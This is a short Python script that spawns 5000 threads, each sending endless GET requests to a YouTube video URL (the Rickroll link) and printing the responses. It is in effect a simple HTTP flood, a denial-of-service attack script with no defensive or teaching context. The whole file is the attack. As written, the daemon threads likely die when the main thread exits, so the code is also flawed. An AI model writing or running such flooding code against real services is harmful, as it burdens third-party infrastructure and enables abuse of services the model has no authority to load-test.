import requests
import threading
from threading import Thread
url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'



def do_request():
    while True:
      response = requests.get(url)
      print(response)



if __name__ == '__main__':
    for i in range(5000):
     Thread(target = do_request, daemon = True).start()
